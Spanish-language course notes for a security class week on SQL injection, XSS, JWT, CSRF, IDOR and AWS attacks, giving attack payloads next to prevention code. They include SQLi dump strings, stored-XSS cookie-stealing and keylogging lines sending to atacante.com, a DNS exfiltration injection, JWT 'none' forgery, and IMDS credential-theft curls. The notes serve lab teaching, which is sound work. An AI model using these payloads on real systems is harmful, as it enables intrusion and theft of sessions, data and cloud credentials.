# Semana 5 — Ataques en profundidad: SQLi, XSS, JWT, SSRF

> Objetivo: entender mecanismos internos de los ataques mas comunes y practicarlos en laboratorio.

---

## SQL Injection avanzado

### Tipos de SQLi

**In-band (respuesta directa):**
```sql
-- Union-based: extraer datos combinando queries
' UNION SELECT null, username, password FROM usuarios--

-- Error-based: provocar errores que revelan info
' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--
```

**Blind (sin respuesta directa):**
```sql
-- Boolean-based: hacer preguntas verdadero/falso
' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE username='admin')='a'--

-- Time-based: si la condicion es true, el servidor tarda mas
' AND IF(1=1, SLEEP(5), 0)--
```

**Out-of-band:**
```sql
-- Exfiltrar via DNS (solo si el servidor tiene acceso externo)
' AND LOAD_FILE(CONCAT('\\\\',@@version,'.atacante.com\\a'))--
```

### sqlmap — herramienta automatica

```bash
# Solo en laboratorio autorizado
sqlmap -u "http://localhost:8081/login" --data "username=admin&password=test" --dbs
sqlmap -u "http://localhost:8081/api?id=1" --tables -D portal
sqlmap -u "http://localhost:8081/api?id=1" --dump -T usuarios -D portal
```

**Importante:** sqlmap NUNCA en sistemas reales sin permiso escrito.

---

## XSS — Cross-Site Scripting

### Tipos

**Reflected XSS:** el payload viene en la URL/request y se refleja en la respuesta.
```
http://vulnerable.com/buscar?q=<script>alert('XSS')</script>
```

**Stored XSS:** el payload se guarda en la BD y se ejecuta cada vez que alguien ve esa pagina.
```javascript
// Comentario malicioso guardado en BD
<script>
  fetch('https://atacante.com/robar?cookie=' + document.cookie)
</script>
```

**DOM XSS:** el JavaScript de la pagina inserta datos del usuario en el DOM sin sanitizar.
```javascript
// Codigo vulnerable (JavaScript de la app)
document.getElementById('saludo').innerHTML = 
    "Hola " + new URLSearchParams(location.search).get('nombre')
// Si nombre = <img src=x onerror=alert(1)> → XSS!
```

### Que puede hacer un XSS

```javascript
// Robar cookies de sesion
new Image().src = 'https://atacante.com/c?c=' + document.cookie

// Keylogger
document.addEventListener('keypress', e => {
    new Image().src = 'https://atacante.com/k?k=' + e.key
})

// Redireccionar a phishing
window.location = 'https://banco-falso.com'

// Tomar control del browser (BeEF framework)
```

### Prevencion de XSS

```python
# FastAPI — escapar HTML antes de insertar en templates
from html import escape

@app.get("/saludo")
async def saludo(nombre: str):
    nombre_seguro = escape(nombre)
    return HTMLResponse(f"<h1>Hola {nombre_seguro}</h1>")
```

```typescript
// Vue 3 — usar v-text en vez de v-html cuando posible
// v-html ejecuta HTML (incluido scripts), v-text escapa
<p v-text="nombreUsuario"></p>   // seguro
<p v-html="comentario"></p>      // peligroso si no se sanitiza
```

**Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
Impide que scripts externos se ejecuten.

---

## JWT Attacks

### Estructura JWT

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJyb2wiOiJ1c2VyIn0.firma
     HEADER                    PAYLOAD                     SIGNATURE
```

Cada parte es Base64 (no cifrado — solo codificado):
```bash
echo "eyJzdWIiOiIxMjMiLCJyb2wiOiJ1c2VyIn0" | base64 -d
# {"sub":"123","rol":"user"}
```

### Ataques JWT

**Algorithm None Attack:**
```python
# Cambiar algoritmo a "none" para eliminar verificacion de firma
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "rol": "admin"}  # escalar privilegios!
# firma = vacia
```

**HS256 → RS256 confusion:**
```python
# Si el servidor acepta HS256 pero tiene clave publica disponible
# Se puede usar la clave publica como secreto HS256
```

**Brute force del secreto:**
```bash
# Con hashcat o jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

**Prevencion:**
```python
# Siempre especificar algoritmos permitidos explicitamente
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])  # NO usar "any"

# Validar expiracion
assert payload["exp"] > datetime.utcnow().timestamp()
```

---

## CSRF — Cross-Site Request Forgery

El atacante engana al usuario para que ejecute acciones no deseadas en un sitio donde esta autenticado.

```html
<!-- Pagina del atacante -->
<img src="http://banco.com/transferir?monto=10000&destino=atacante" />
<!-- Si el usuario esta logueado en banco.com, la imagen ejecuta la transferencia -->
```

**Prevencion:** tokens CSRF en cada formulario.

```python
# FastAPI con CSRF token
from fastapi_csrf_protect import CsrfProtect

@app.post("/transferir")
async def transferir(csrf_protect: CsrfProtect = Depends()):
    csrf_protect.validate_csrf(request)  # falla si no hay token valido
```

---

## IDOR — Insecure Direct Object Reference (avanzado)

```bash
# Primero ve tu ID
GET /api/documentos/45  → tu documento

# Enumerar otros
for i in $(seq 1 200); do
    curl -s -o /dev/null -w "%{http_code}" http://api/documentos/$i
done
# Si devuelve 200 en IDs que no son tuyos → IDOR

# Cambiar el ID en el JWT payload (si el server no valida)
# sub: "45" → "1" (admin)
```

---

## Spring Boot Security — vulnerabilidades comunes

```java
// INSEGURO — endpoint sin autenticacion
@GetMapping("/admin/usuarios")
public List<Usuario> getUsuarios() {
    return usuarioRepo.findAll();
}

// SEGURO — con Spring Security
@GetMapping("/admin/usuarios")
@PreAuthorize("hasRole('ADMIN')")
public List<Usuario> getUsuarios() {
    return usuarioRepo.findAll();
}
```

### Configuracion Spring Security

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf().disable()  // OJO: solo si usas JWT stateless
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
            .build();
    }
}
```

### Dependencias de seguridad en Spring Boot

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.11.5</version>
</dependency>
```

---

## AWS Security — ataques a la nube

### IMDS (Instance Metadata Service)

```bash
# Desde una instancia EC2 comprometida (o via SSRF):
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → devuelve AccessKeyId, SecretAccessKey, Token temporales
```

**Mitigacion:** IMDSv2 requiere token previo, dificulta SSRF.

### S3 buckets publicos

```bash
# Verificar si un bucket es publico
aws s3 ls s3://nombre-bucket --no-sign-request

# Buscar buckets mal configurados (Google dorking)
site:s3.amazonaws.com "confidential" OR "password" OR "backup"
```

### Least Privilege en IAM

```json
// MAL — acceso total
{"Effect": "Allow", "Action": "*", "Resource": "*"}

// BIEN — solo lo necesario
{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::mi-bucket/uploads/*"
}
```

---

## Herramientas de esta semana

| Herramienta | Uso | Donde |
|------------|-----|-------|
| sqlmap | SQL injection automatico | Kali Linux |
| jwt.io | Decodificar/verificar JWT | Browser |
| jwt_tool | Ataques JWT | pip install jwt-tool |
| WebGoat | Laboratorio OWASP | Docker |
| Burp Suite | Interceptar/modificar HTTP | Todos los SO |
